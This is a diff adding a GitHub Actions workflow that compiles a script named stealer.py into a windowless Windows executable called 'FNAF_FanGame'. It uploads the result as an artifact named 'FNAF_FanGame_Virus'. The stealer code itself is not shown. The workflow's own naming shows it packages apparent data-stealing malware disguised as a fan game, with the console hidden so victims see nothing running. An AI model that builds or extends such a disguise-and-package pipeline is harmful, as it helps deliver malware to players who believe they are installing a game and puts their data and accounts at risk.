@@ -1,0 +1,33 @@
+name: Build EXE
+
+on:
+  workflow_dispatch:  # This allows you to run it manually
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.11'
+
+    - name: Install dependencies
+      run: |
+        pip install pyinstaller pywin32 requests
+      shell: pwsh
+
+    - name: Build EXE
+      run: |
+        pyinstaller --onefile --noconsole --name "FNAF_FanGame" stealer.py
+      shell: pwsh
+
+    - name: Upload Artifact
+      uses: actions/upload-artifact@v2
+      with:
+        name: FNAF_FanGame_Virus
+        path: dist/FNAF_FanGame.exe
